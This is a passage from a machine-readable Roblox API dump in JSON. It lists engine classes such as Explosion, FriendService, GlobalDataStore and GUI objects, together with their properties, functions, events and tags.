"Name":"GoodbyeDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"ResponseDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"UserDialog","tags":[],"Class":"DialogChoice"},{"Superclass":"Instance","type":"Class","Name":"DoubleConstrainedValue","tags":[]},{"ValueType":"double","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MaxValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MinValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"DoubleConstrainedValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"DoubleConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"DoubleConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Dragger","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Axis","Name":"axis","Default":"X"}],"Name":"AxisRotate","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"mousePart","Default":null},{"Type":"Vector3","Name":"pointOnMousePart","Default":null},{"Type":"Objects","Name":"parts","Default":null}],"Name":"MouseDown","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Ray","Name":"mouseRay","Default":null}],"Name":"MouseMove","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MouseUp","tags":[],"Class":"Dragger","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Explosion","tags":[]},{"ValueType":"float","type":"Property","Name":"BlastPressure","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"BlastRadius","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"DestroyJointRadiusPercent","tags":[],"Class":"Explosion"},{"ValueType":"ExplosionType","type":"Property","Name":"ExplosionType","tags":[],"Class":"Explosion"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Explosion"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"distance","Type":"float"}],"Name":"Hit","tags":[],"Class":"Explosion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"FaceInstance","tags":["notbrowsable"]},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"FaceInstance"},{"Superclass":"FaceInstance","type":"Class","Name":"Decal","tags":[]},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Shiny","tags":["deprecated"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Specular","tags":["deprecated"],"Class":"Decal"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"Decal"},{"Superclass":"Decal","type":"Class","Name":"Texture","tags":[]},{"ValueType":"float","type":"Property","Name":"StudsPerTileU","tags":[],"Class":"Texture"},{"ValueType":"float","type":"Property","Name":"StudsPerTileV","tags":[],"Class":"Texture"},{"Superclass":"Instance","type":"Class","Name":"Feature","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"FaceId","tags":[],"Class":"Feature"},{"ValueType":"InOut","type":"Property","Name":"InOut","tags":[],"Class":"Feature"},{"ValueType":"LeftRight","type":"Property","Name":"LeftRight","tags":[],"Class":"Feature"},{"ValueType":"TopBottom","type":"Property","Name":"TopBottom","tags":[],"Class":"Feature"},{"Superclass":"Feature","type":"Class","Name":"Hole","tags":["deprecated"]},{"Superclass":"Feature","type":"Class","Name":"MotorFeature","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Fire","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Fire"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Heat","tags":[],"Class":"Fire"},{"ValueType":"Color3","type":"Property","Name":"SecondaryColor","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"size","tags":["deprecated"],"Class":"Fire"},{"Superclass":"Instance","type":"Class","Name":"FlagStandService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FlyweightService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"CSGDictionaryService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"NonReplicatedCSGDictionaryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Folder","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ForceField","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FriendService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBreakFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetCreateFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetDeleteFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetEnabled","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFriendsOnlineUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetGetFriendsUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetMakeFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"FunctionalTest","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"FunctionalTest"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Error","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Failed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Pass","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Passed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Warn","tags":[],"Class":"FunctionalTest","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"GamePassService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"playerHasPassUrl","Default":null}],"Name":"SetPlayerHasPassUrl","tags":["LocalUserSecurity"],"Class":"GamePassService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null}],"Name":"PlayerHasPass","tags":[],"Class":"GamePassService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GameSettings","tags":["notbrowsable"]},{"ValueType":"float","type":"Property","Name":"BubbleChatLifetime","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"BubbleChatMaxBubbles","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatScrollLength","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"CollisionSoundEnabled","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"float","type":"Property","Name":"CollisionSoundVolume","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"HardwareMouse","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"MaxCollisionSounds","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ReportAbuseChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoftwareSound","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoundEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"VideoCaptureEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"VideoQualitySettings","type":"Property","Name":"VideoQuality","tags":[],"Class":"GameSettings"},{"Arguments":[{"Name":"recording","Type":"bool"}],"Name":"VideoRecordingChangeRequest","tags":["RobloxScriptSecurity"],"Class":"GameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"GamepadService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Geometry","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GlobalDataStore","tags":[]},{"ReturnType":"Connection","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"callback","Default":null}],"Name":"OnUpdate","tags":[],"Class":"GlobalDataStore","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"int","Name":"delta","Default":"1"}],"Name":"IncrementAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"transformFunction","Default":null}],"Name":"UpdateAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"Superclass":"GlobalDataStore","type":"Class","Name":"OrderedDataStore","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"bool","Name":"ascending","Default":null},{"Type":"int","Name":"pagesize","Default":null},{"Type":"Variant","Name":"minValue","Default":null},{"Type":"Variant","Name":"maxValue","Default":null}],"Name":"GetSortedAsync","tags":[],"Class":"OrderedDataStore","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GroupService","tags":["notCreatable"]},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetAlliesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetEnemiesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetGroupInfoAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGroupsAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GuiBase","tags":[]},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase2d","tags":["notbrowsable"]},{"ValueType":"Vector2","type":"Property","Name":"AbsolutePosition","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteSize","tags":["readonly"],"Class":"GuiBase2d"},{"Superclass":"GuiBase2d","type":"Class","Name":"GuiObject","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BackgroundColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BackgroundColor3","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"BackgroundTransparency","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BorderColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BorderColor3","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"BorderSizePixel","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"ClipsDescendants","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Draggable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionDown","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionLeft","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionRight","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionUp","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Position","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Rotation","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Selectable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"GuiObject"},{"ValueType":"SizeConstraint","type":"Property","Name":"SizeConstraint","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":["hidden"],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"GuiObject"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenPosition","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSize","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSizeAndPosition","tags":[],"Class":"GuiObject","type":"Function"},{"Arguments":[{"Name":"initialPosition","Type":"UDim2"}],"Name":"DragBegin","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"DragStopped","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputBegan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputChanged","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputEnded","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseEnter","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseLeave","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseMoved","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelBackward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelForward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionGained","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionLost","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchLongPress","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPinch","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchRotate","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"}],"Name":"TouchSwipe","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"}],"Name":"TouchTap","tags":[],"Class":"GuiObject","type":"Event"},{"Superclass":"GuiObject","type":"Class","Name":"Frame","tags":[]},{"ValueType":"FrameStyle","type":"Property","Name":"Style","tags":[],"Class":"Frame"},{"Superclass":"GuiObject","type":"Class","Name":"GuiButton","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"AutoButtonColor","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Modal","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Selected","tags":[],"Class":"GuiButton"},{"ValueType":"ButtonStyle","type":"Property","Name":"Style","tags":[],"Class":"GuiButton"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"verb","Default":null}],"Name":"SetVerb","tags":["RobloxScriptSecurity"],"Class":"GuiButton","type":"Function"},{"Arguments":[],"Name":"MouseButton1Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Up","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[],"Name":"MouseButton2Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Up","tags":[],"Class":"GuiButton","type":"Event"},{"Superclass":"GuiButton","type":"Class","Name":"ImageButton","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageButton"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageButton"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageButton"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageButton"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageButton"},{"Superclass":"GuiButton","type":"Class","Name":"TextButton","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextButton"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextButton"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextButton"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextButton"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextButton"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextButton"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextButton"},{"Superclass":"GuiObject","type":"Class","Name":"GuiLabel","tags":[]},{"Superclass":"GuiLabel","type":"Class","Name":"ImageLabel","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageLabel"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageLabel"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageLabel"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageLabel"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageLabel"},{"Superclass":"GuiLabel","type":"Class","Name":"TextLabel","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextLabel"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextLabel"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextLabel"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextLabel"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextLabel"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextLabel"},{"Superclass":"GuiObject","type":"Class","Name":"Scale9Frame","tags":[]},{"ValueType":"Vector2int16","type":"Property","Name":"ScaleEdgeSize","tags":[],"Class":"Scale9Frame"},{"ValueType":"string","type":"Property","Name":"SlicePrefix","tags":[],"Class":"Scale9Frame"},{"Superclass":"GuiObject","type":"Class","Name":"ScrollingFrame","tags":[]},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteWindowSize","tags":["readonly"],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"BottomImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Vector2","type":"Property","Name":"CanvasPosition","tags":[],"Class":"ScrollingFrame"},{"ValueType":"UDim2","type":"Property","Name":"CanvasSize","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"MidImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"int","type":"Property","Name":"ScrollBarThickness","tags":[],"Class":"ScrollingFrame"},{"ValueType":"bool","type":"Property","Name":"ScrollingEnabled","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"TopImage","tags":[],"Class":"ScrollingFrame"},{"Superclass":"GuiObject","type":"Class","Name":"TextBox","tags":[]},{"ValueType":"bool","type":"Property","Name":"ClearTextOnFocus","tags":[],"Class":"TextBox"},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextBox"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"MultiLine","tags":[],"Class":"TextBox"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextBox"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextBox"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextBox"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextBox"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextBox"},{"ReturnType":"void","Arguments":[],"Name":"CaptureFocus","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFocused","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReleaseFocus","tags":[],"Class":"TextBox","type":"Function"},{"Arguments":[{"Name":"enterPressed","Type":"bool"},{"Name":"inputThatCausedFocusLoss","Type":"Instance"}],"Name":"FocusLost","tags":[],"Class":"TextBox","type":"Event"},{"Arguments":[],"Name":"Focused","tags":[],"Class":"TextBox","type":"Event"},{"Superclass":"GuiBase2d","type":"Class","Name":"LayerCollector","tags":[]},{"Superclass":"LayerCollector","type":"Class","Name":"BillboardGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"ExtentsOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"PlayerToHideFrom","tags":[],"Class":"BillboardGui"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector2","type":"Property","Name":"SizeOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"StudsOffset","tags":[],"Class":"BillboardGui"},{"Superclass":"LayerCollector","type":"Class","Name":"ScreenGui","tags":[]},{"Superclass":"ScreenGui","type":"Class","Name":"GuiMain","tags":["deprecated"]},{"Superclass":"LayerCollector","type":"Class","Name":"SurfaceGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"SurfaceGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"SurfaceGui"},{"ValueType":"Vector2","type":"Property","Name":"CanvasSize","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SurfaceGui"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"ToolPunchThroughDistance","tags":[],"Class":"SurfaceGui"},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase3d","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Color","tags":["deprecated","hidden"],"Class":"GuiBase3d"},{"ValueType":"Color3","type":"Property","Name":"Color3","tags":[],"Class":"GuiBase3d"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"GuiBase3d"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiBase3d"},{"Superclass":"GuiBase3d","type":"Class","Name":"FloorWire","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"From","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":[],"Class":"FloorWire"},{"ValueType":"Co